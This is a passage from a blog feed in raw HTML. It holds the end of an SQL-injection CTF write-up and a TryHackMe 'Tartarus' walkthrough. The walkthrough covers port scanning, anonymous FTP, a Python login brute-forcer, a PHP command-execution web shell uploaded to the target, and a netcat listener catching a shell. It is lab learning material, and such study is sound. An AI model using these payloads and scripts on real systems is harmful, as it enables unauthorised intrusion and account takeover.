    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 32.911392405063296%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAABYlAAAWJQFJUiTwAAABbElEQVQoz4WRXUvbUACG80dESdI0H01ibZLaplXwC6m96B+bUImusjLGxqYX+wu79wu888IbQQSt4HDr4loweTyJk13o3AsP78WB57ycI/Xff6TX/8A70duio16fTUE36rHe3WR9Y4s3orvRW6Joi3rYZGJSxrZdwrkF5mshjXCORq1BveIjHZ3HfD0a8OVgwOf9q7wfuWbn8Jpdwae9K76dDsmyttZCMR1mg4D6tIlVstF1A1NTKWga0vnlDReDG+5GY37Gvxm+wI9hzO3wjl9xzNLiIlNKgfJsE9+xcOwSumGgKgqqqiIdn33n5OI2v/0+SUnT5yRJwn0Ko9GIVquFLMu4QhhWxcrAw53x8qWmaSDxJ4mQJek/EMIsmbDdbiMrKhXxZlXfw5sp47oujiMomUhPK17L03kmXF5ZxbBsvGqNciVgWnyEH9TESh9V0/8K/0eW8XhMp9OhUNDQizrFYjHHMMx8oWWVeACEEI6w5zyIoAAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;chrome dev tools&quot;
        title=&quot;chrome dev tools&quot;
        src=&quot;/static/bbe542a7cfcd190161dc9ca13f344064/f058b/chrome-dev-tools.png&quot;
        srcset=&quot;/static/bbe542a7cfcd190161dc9ca13f344064/c26ae/chrome-dev-tools.png 158w,
/static/bbe542a7cfcd190161dc9ca13f344064/6bdcf/chrome-dev-tools.png 315w,
/static/bbe542a7cfcd190161dc9ca13f344064/f058b/chrome-dev-tools.png 630w,
/static/bbe542a7cfcd190161dc9ca13f344064/40601/chrome-dev-tools.png 945w,
/static/bbe542a7cfcd190161dc9ca13f344064/78612/chrome-dev-tools.png 1260w,
/static/bbe542a7cfcd190161dc9ca13f344064/d9ed5/chrome-dev-tools.png 2880w&quot;
        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;The result can be seen here:&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/b1720a93e132de57aa04aa9e438d3c92/701e9/response-debug.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 63.92405063291139%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAABYlAAAWJQFJUiTwAAAAqElEQVQ4y+2OzQrCMBCE84iKKGgwtemP+Ko99AHyBKU0LSSlpdBkpIsHDyUUPerCx4QhM7tMRBLRLYEQMUQUI83uyPMHZJJBygwXfgXngvR4OmO3PwRhVVWhrms0TYNhGKC1Rtd1RNu2sNaS75zDPDvSEEwphaIoUJYl6TRNr/BMLG/vPbYOG8cRxhi6ou/71fDibYWtbVn7+O4HLwyFPxn2bcG/8BcLnzSA3+ls8h+gAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;response debug&quot;
        title=&quot;response debug&quot;
        src=&quot;/static/b1720a93e132de57aa04aa9e438d3c92/f058b/response-debug.png&quot;
        srcset=&quot;/static/b1720a93e132de57aa04aa9e438d3c92/c26ae/response-debug.png 158w,
/static/b1720a93e132de57aa04aa9e438d3c92/6bdcf/response-debug.png 315w,
/static/b1720a93e132de57aa04aa9e438d3c92/f058b/response-debug.png 630w,
/static/b1720a93e132de57aa04aa9e438d3c92/40601/response-debug.png 945w,
/static/b1720a93e132de57aa04aa9e438d3c92/78612/response-debug.png 1260w,
/static/b1720a93e132de57aa04aa9e438d3c92/701e9/response-debug.png 1780w&quot;
        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;After that, I’ve tried a few other passwords without any lucky until I finally figured out what was happening. I then, sent the payload &lt;code class=&quot;language-text&quot;&gt;&amp;#39; be 1=1--&lt;/code&gt; and got the last missing flag. Over and out.&lt;/p&gt;
&lt;h4&gt;Explanation&lt;/h4&gt;
&lt;p&gt;Here’s what happened: The result from &lt;strong&gt;abc&lt;/strong&gt; was &lt;strong&gt;nop&lt;/strong&gt; as you could see. And &lt;strong&gt;a&lt;/strong&gt; is one letter of distance from &lt;strong&gt;b&lt;/strong&gt; while &lt;strong&gt;c&lt;/strong&gt; are two letters from &lt;strong&gt;a&lt;/strong&gt; right? The same applies to our password response &lt;strong&gt;nop&lt;/strong&gt;. From that point on, it was pretty easy to tell… On the backend, somewhere somehow to each letter of our password, the position is shifted by &lt;strong&gt;12&lt;/strong&gt; chars to the right from its original position. &lt;/p&gt;
&lt;p&gt;So lets say we send &lt;strong&gt;car&lt;/strong&gt; as our password. The result is going to be:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;First letter is &lt;strong&gt;c&lt;/strong&gt;: shift 12 positions away and you’ll get the letter &lt;strong&gt;p&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;Second letter is &lt;strong&gt;a&lt;/strong&gt;: shift 12 positions away and you’ll get the letter &lt;strong&gt;n&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;Last letter is &lt;strong&gt;r&lt;/strong&gt;: shift 12 positions away and you’ll get the letter &lt;strong&gt;f&lt;/strong&gt; (its circular, so once it reaches the letter &lt;strong&gt;z&lt;/strong&gt; it starts over)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Dope, but again.. what do we do with that information now? Well, how about crafting a payload that after converted, translates its final result into  &lt;code class=&quot;language-text&quot;&gt;or 1=1--&lt;/code&gt;? That could work. So applying the same idea to the new password, that would be &lt;code class=&quot;language-text&quot;&gt;be 1=1&lt;/code&gt;. This is how we get the last flag.&lt;/p&gt;
&lt;h3&gt;Wrapping up&lt;/h3&gt;
&lt;p&gt;Even by being a pretty basic SQLi CTF I yet found this really entertaining. Hope you’ve learnt something from this. I’ll see you all next time.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[TryHackMe - Tartarus CTF Writeup]]></title><description><![CDATA[This is my first TryHackMe writeup. Tartarus was flagged as na easy machine and took me around 2 hours to get the root. Without further ado…]]></description><link>https://gatsby-starter-blog-demo.netlify.app/try-hack-me-tartarus/</link><guid isPermaLink="false">https://gatsby-starter-blog-demo.netlify.app/try-hack-me-tartarus/</guid><pubDate>Sun, 01 Nov 2020 22:12:03 GMT</pubDate><content:encoded>&lt;p&gt;This is my first &lt;a href=&quot;https://tryhackme.com/&quot;&gt;TryHackMe&lt;/a&gt; writeup. Tartarus was flagged as na easy machine and took me around 2 hours to get the root. Without further ado, lets get to it.   &lt;/p&gt;
&lt;h2&gt;Enumeration&lt;/h2&gt;
&lt;p&gt;I like to start it off by quickly checking whats in front of me. &lt;a href=&quot;https://nmap.org/&quot;&gt;Nmap&lt;/a&gt; can help with that. My &lt;em&gt;go-to&lt;/em&gt; approach is usually:&lt;/p&gt;
&lt;p&gt;&lt;em&gt;P.S: Quick heads up: There will be command breakdown in the end of every article so you can use for future reference. For now, just bear with me.&lt;/em&gt;  &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ nmap -Pn -sC -sV tartarus.htm | tee -a nmap-standard-ports

Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-28 07:14 EDT
Nmap scan report for tartarus.thm (10.10.129.210)
Host is up (0.054s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.11.16.191
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 98:6c:7f:49:db:54:cb:36:6d:d5:ff:75:42:4c:a7:e0 (RSA)
|   256 0c:7b:1a:9c:ed:4b:29:f5:3e:be:1c:9a:e4:4c:07:2c (ECDSA)
|_  256 50:09:9f:c0:67:3e:89:93:b0:c9:85:f1:93:89:50:68 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.28 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ok, as you can see nmap has replied with 3 open ports being 21 (&lt;strong&gt;ftp&lt;/strong&gt;), 22 (&lt;strong&gt;ssh&lt;/strong&gt;) and 80 (&lt;strong&gt;http&lt;/strong&gt;). Also, because we took advantage of &lt;a href=&quot;https://nmap.org/book/nse-usage.html&quot;&gt;nmap-scripts&lt;/a&gt;, we were able to get some additional juice, showing that FTP is allowing &lt;strong&gt;anonymous login&lt;/strong&gt; and also that it is hosting a file called &lt;strong&gt;test.txt&lt;/strong&gt;, which might contain interesting information. &lt;/p&gt;
&lt;p&gt;In parallel while I poke around, I usually like having nmap doing a full scan on background:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ nmap -Pn -p- tartarus.htm | tee -a nmap-all-ports&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The reason for doing this wasn’t so much about finding exploitable applications but basically to understand whether I should also expand my attention to any available custom ports. That wasn’t the case. &lt;/p&gt;
&lt;h3&gt;FTP (21) - Part I&lt;/h3&gt;
&lt;p&gt;In the meantime, I logged myself on the FTP server and grabbed the &lt;strong&gt;test.txt&lt;/strong&gt; file. As you know by now, anonymous login was allowed:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;Name (tartarus.thm:hatecomputers): anonymous
331 Please specify the password.
Password: &amp;lt;JUST-PRESS-ENTER&amp;gt;
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
226 Directory send OK.
ftp&amp;gt; get test.txt
local: test.txt remote: test.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for test.txt (17 bytes).
226 Transfer complete.
17 bytes received in 0.00 secs (22.8357 kB/s)
ftp&amp;gt; exit
221 Goodbye.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;echoing its content gave me this:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ cat test.txt
vsftpd test file&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Which wasn’t necessarily useful. &lt;/p&gt;
&lt;h3&gt;Web (80) - Part I&lt;/h3&gt;
&lt;p&gt;I decided then, to run &lt;strong&gt;cURL&lt;/strong&gt; against the host looking for any possible leaks. Performing a simple &lt;code class=&quot;language-text&quot;&gt;GET&lt;/code&gt; request returned me this:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ curl -s -i tartarus.thm

HTTP/1.1 200 OK
Date: Mon, 28 Sep 2020 13:02:09 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Sun, 05 Jul 2020 21:31:26 GMT
ETag: &amp;quot;2c39-5a9b87b015a4a&amp;quot;
Accept-Ranges: bytes
Content-Length: 11321
Vary: Accept-Encoding
Content-Type: text/html


&amp;lt;!DOCTYPE html PUBLIC &amp;quot;-//W3C//DTD XHTML 1.0 Transitional//EN&amp;quot; &amp;quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dt
d&amp;quot;&amp;gt;
&amp;lt;html xmlns=&amp;quot;http://www.w3.org/1999/xhtml&amp;quot;&amp;gt;
  &amp;lt;!--
    Modified from the Debian original for Ubuntu
    Last updated: 2014-03-19

    Output truncated...&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;You see Apache version was leaking (&lt;strong&gt;2.4.18&lt;/strong&gt;). Other than that, was just a simple default Apache server page.&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/77ed571ba8802445b01dbfea226c2301/35252/apache.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 60.75949367088608%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAAAsSAAALEgHS3X78AAACdklEQVQoz31R3U/TcBTdf2HwIwgoUWAmavDFJ331L/HV+KwoEBGRDyEbiAGV+GYwBl9NTAyMjTG2fq5r99Gu61bWdkAZBDQeb38YE3Ux6ck5ufd3T869DfWGb+BSz3V0doXR1X0VV/pvI3zzDnqu3cLFy/1o7+jF+c4w2jv7iPtwrr0Hp892o+1MN061XWD65E0fOsgjFHn5GpG5N5iOLGBschaR6Dyi9+5i6vkEhkYn8HDwKR48HsGj4WekRzAwNMpqg0/GMP5iFtPRV8RzmJldRHR+CaFcoQLDcqFXHOjEhzt7aLwdx7eaBc9pwNCKsE0LlVIZVcMkNmDpga4AP+g7+g7TOpkNPEIpToGYLYFXCBkF8vAS1u7PQBhYQHXqA+zpj7AjK6i/+4xadAXVyWVWt6aWYY6/Rz3yCVKMB6/qEOQiQhlBg6waDIJcQF5SkBezUDgBcoZHjpcgptLgtzKQ0xw0UYb6C8HbKiXX8ibEnM48fhtKgWG2iJJRQkkvQjeKKFfKxCViE/Z2DY5bR53geg68hse03/RR0C2Iyl+GATgpj69xDl/WtrCaFLHBqUgSxBz1KD1HKyXSCtY2JcRSMmKbMvU11mOhKOUfhjw1kqktJJIpxDc2sRpbx3piA7F4AvFEEmk6QYYXwQsSaQE8nWa77iFHK0v/rEwpRFpZ12nlEq1bLjMYhk41HbVqFa7jwHVdeJ7HtG3bOD4+glZsdcPAUCnCokFV01A2K2js7MLfb2K/eQDfb2LP32fY3fMZB71AZzW9RUL2Uwp0aBfVmo2clmdDzYNDMjxk3ArBG+V/htt1h9KZUFSVJTsxPGiJVoY/AfxtITuibTeaAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;apache&quot;
        title=&quot;apache&quot;
        src=&quot;/static/77ed571ba8802445b01dbfea226c2301/f058b/apache.png&quot;
        srcset=&quot;/static/77ed571ba8802445b01dbfea226c2301/c26ae/apache.png 158w,
/static/77ed571ba8802445b01dbfea226c2301/6bdcf/apache.png 315w,
/static/77ed571ba8802445b01dbfea226c2301/f058b/apache.png 630w,
/static/77ed571ba8802445b01dbfea226c2301/40601/apache.png 945w,
/static/77ed571ba8802445b01dbfea226c2301/35252/apache.png 1204w&quot;
        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Not very useful either, although default versions usually mean default configurations - and default passwords if there are any places to log us in. Running &lt;code class=&quot;language-text&quot;&gt;Gobuster&lt;/code&gt; was next logical step:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ gobuster dir -u http://tartarus.thm -w /usr/share/SecLists/Discovery/Web-Content/raft-medium-directories.txt -t 20
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://tartarus.thm
[+] Threads:        20
[+] Wordlist:       /usr/share/SecLists/Discovery/Web-Content/raft-medium-directories.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/28 09:14:08 Starting gobuster
===============================================================
/server-status (Status: 403)
===============================================================
2020/09/28 09:16:08 Finished
===============================================================&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;em&gt;P.S: If you yet don’t have &lt;strong&gt;SecList&lt;/strong&gt; as part of your current workflow, make sure to grab it &lt;a href=&quot;https://github.com/danielmiessler/SecLists&quot;&gt;here&lt;/a&gt;. Or if you doing from kali linux, you can do the same by apt -y install seclists. This should be available under &lt;strong&gt;/usr/share/&lt;/strong&gt; directory.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Also couldn’t find anything useful. &lt;strong&gt;/server-status&lt;/strong&gt; was available but forbidden. Shamelessly then, I decided to run &lt;strong&gt;searchsploit&lt;/strong&gt; expecting to shed some light and yet, it seemed there was no available exploits for any of the running applications. Took a quick for a coffee and came back. It worked.&lt;/p&gt;
&lt;p&gt;Turns out, I missed something quite obvious during my initial recon.&lt;/p&gt;
&lt;h3&gt;FTP (21) - Part II&lt;/h3&gt;
&lt;p&gt;I again got myself logged in on FTP but now looking more carefully at things:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;ftp&amp;gt; ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 .
-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 .. 
-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 ... 
-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
226 Directory send OK.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If you are slightly comfortable with *nix environments, you know that &lt;code class=&quot;language-text&quot;&gt;.&lt;/code&gt; alone means current directory, &lt;code class=&quot;language-text&quot;&gt;..&lt;/code&gt; means previous directory but &lt;code class=&quot;language-text&quot;&gt;...&lt;/code&gt; isn’t really a thing. So, someone deliberately named a directory &lt;code class=&quot;language-text&quot;&gt;...&lt;/code&gt;. Interesting. Let’s have a look: &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;ftp&amp;gt; cd ...
200 PORT command successful. Consider using PASV.
ftp&amp;gt; ls -al
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 yougotgoodeyes.txt
ftp&amp;gt; get yougotgoodeyes.txt
150 Here comes the directory listing.
226 Directory send OK.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;So there was indeed, a different file and the content was just &lt;strong&gt;/sUp3r-s3cr3t&lt;/strong&gt;. Judging by the forward slash prefix, it stroke me as a potential web directory. It was. Time to give the http server a go again.&lt;/p&gt;
&lt;h3&gt;Web (80) - Part II&lt;/h3&gt;
&lt;p&gt;Presented with a login page, I tried a few default username/password combinations just to make sure I wasn’t really missing anything. &lt;strong&gt;Gobuster&lt;/strong&gt; was already running in background and found a directory called &lt;strong&gt;/images&lt;/strong&gt; (I’ve ran the same &lt;strong&gt;Gobuster&lt;/strong&gt; as the one above but adding the &lt;strong&gt;/sUp3r-s3cr3t&lt;/strong&gt; at the end of the url), which I couldn’t access.&lt;/p&gt;
&lt;p&gt;Also, while initially poking around, I assumed - &lt;strong&gt;n00b mistake&lt;/strong&gt; - that since it was a default Apache setup, everything was also default so I didn’t bother checking. I went back and found out that &lt;strong&gt;/robots.txt&lt;/strong&gt; was available, giving away a pretty important piece of information:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;User-Agent: *
Disallow: /admin-dir

I told d4rckh we should hide our things deep&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This led me to a open directory where I also found two files: &lt;strong&gt;credentials.txt&lt;/strong&gt; and &lt;strong&gt;userid&lt;/strong&gt;. Both files contained what appeared to be a list of passwords and usernames.&lt;/p&gt;
&lt;p&gt;After investing some time trying to sort out &lt;code class=&quot;language-text&quot;&gt;Hydra&lt;/code&gt;’s terrible syntax that led me nowhere, out of frustration I decided to brute force my way in scripting it myself. After manually poking with the login page to understand how it worked, I wrote this:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;#!/usr/bin/python3

import requests;                                                                                    
                                                                                                    
url = &amp;quot;http://tartarus.thm/sUp3r-s3cr3t/authenticate.php&amp;quot;                                           
                                                                                                    
with open(&amp;#39;userid&amp;#39;, &amp;#39;r&amp;#39;) as f:                                                                      
    usernames = [username.strip() for username in f.readlines() if username]                        
                                                                                                    
with open(&amp;#39;credentials.txt&amp;#39;, &amp;#39;r&amp;#39;) as f:                                                             
    passwords = [password.strip() for password in f.readlines() if password]
                                                  
print(&amp;#39;Brute forcing...&amp;#39;)          
for user in usernames:             
    response = requests.post(url, {                                                                 
        &amp;quot;username&amp;quot;: user,                                                                           
        &amp;quot;password&amp;quot;: &amp;#39;doesntmatter&amp;#39;                                                                  
    })                                                                                              
                                                                                                    
    if response.status_code == 200 and response.text == &amp;#39;Incorrect password!&amp;#39;:
        found_user = user                         
        print(f&amp;#39;username {user}&amp;#39;)                 
        break                                     
                                                  
for passwd in passwords:           
    response = requests.post(url, {
        &amp;quot;username&amp;quot;: found_user,
        &amp;quot;password&amp;quot;: passwd
    })

    if response.status_code == 200 and response.text != &amp;#39;Incorrect password!&amp;#39;:
        print(f&amp;#39;password {passwd}&amp;#39;)
        break&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The script is quite self explanatory. I basically replicated the same step-by-step I had previously executed manually to then, move that into actual piece of program that can repeat the tedious process of going through both lists and validate all the possibilities. There might be better ways of doing so but I think being able to craft your own “exploits” as you go is a fine art. I suggest you to exercise that as much as you can.  &lt;/p&gt;
&lt;p&gt;Combining that with both &lt;strong&gt;credentials&lt;/strong&gt; and &lt;strong&gt;userid&lt;/strong&gt; wordlists, I managed to find the user and password necessary (&lt;strong&gt;enox:P@ssword1234&lt;/strong&gt;) so I could log in, which presented me with a “Upload your file” kind of page.&lt;/p&gt;
&lt;h3&gt;Getting a shell + user flag&lt;/h3&gt;
&lt;p&gt;I immediately created a simple php file with this and send it over: &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;?php
system($_GET[&amp;#39;cmd&amp;#39;])
?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;I could’ve gone for the &lt;a href=&quot;https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php&quot;&gt;pentest monkey php reverse shell&lt;/a&gt; but I usually try to make things as simple as I can. And honestly, this gives me everything I need: &lt;code class=&quot;language-text&quot;&gt;system&lt;/code&gt; function executes whenever command I would passed in, while the &lt;code class=&quot;language-text&quot;&gt;$_GET[&amp;#39;cmd&amp;#39;]&lt;/code&gt; is a request param I’ve sent (which I named &lt;strong&gt;cmd&lt;/strong&gt;). &lt;/p&gt;
&lt;p&gt;Then I open up &lt;strong&gt;Burpsuite&lt;/strong&gt;, went &lt;strong&gt;to&lt;/strong&gt; directory where my php script landed. &lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/5181883912c3711b0cb6d2fecc8be241/11a8f/burp.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 72.78481012658227%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAAAsSAAALEgHS3X78AAABsElEQVQ4y8VT2XLbMAzk//9Zk3ZyuY4zsT1OrIs6LInURR3cArSdxLHbpk/lzIoXsFhQgPj24wHfb2aYzRa4vZ/j6u4J949LzBcrh58Oy8NMZ08rBFGKKM4QHiCTHDLNkWQFxPx5g81rgEim8MPYXezy8gQZIS+UA+9LVaHUjBqF0ghCia0fEo8HEXkewiAiwoQcShjTO3TGoOsM2q6D6XskkYTaZW7dtt0e3X6u6wZlqfHy6kPcPSxwfX2L9WqNwAugSoWCVFSkQpGKqm4JDdYbD/w8HJgVyTiBrmqnVJFSXtdNC5FEOTbLF4TeFrHvI5USORmrLMOO0LYtNDnpqoK1FtM4YpoYk9tbOx1gMQwDhOfneF7t4G8lijiGUQoDpTuQw0jObMgpKVLMw+J8HM9G8hFN06FpjENPbzdSFI7EZDyzEk79jdCpOocjJB/xMabFZcMThfZc4zshKdw74oTgsyE/dvkvhH8zZEJO+/8T/u6xHeGXfsoHwkvjeNd8USFXhODPe5FejlxRFxTUQUenP5ZNmmbUh8p1xL6PzRm01tTnhet1LqFLNj31ONv9Au+7jUwrKIjsAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;burp&quot;
        title=&quot;burp&quot;
        src=&quot;/static/5181883912c3711b0cb6d2fecc8be241/f058b/burp.png&quot;
        srcset=&quot;/static/5181883912c3711b0cb6d2fecc8be241/c26ae/burp.png 158w,
/static/5181883912c3711b0cb6d2fecc8be241/6bdcf/burp.png 315w,
/static/5181883912c3711b0cb6d2fecc8be241/f058b/burp.png 630w,
/static/5181883912c3711b0cb6d2fecc8be241/40601/burp.png 945w,
/static/5181883912c3711b0cb6d2fecc8be241/78612/burp.png 1260w,
/static/5181883912c3711b0cb6d2fecc8be241/11a8f/burp.png 1272w&quot;
        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Then, back to the terminal I typed: &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ nc -vlp 4444&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And just waited. &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ nc -vlp 4444
www-data@ubuntu-xenial:/var/www/html/sUp3r-s3cr3t/images/uploads$ ls                                
ls                                                                                                  
pogcat.png  shell.php
www-data@ubuntu-xenial:/var/www/html/sUp3r-s3cr3t/images/uploads$ cd /home &amp;amp;&amp;amp; ls
cleanup  d4rckh  thirtytwo
www-data@ubuntu-xenial:/home$ cd d4rckh
cd d4rckh                                         
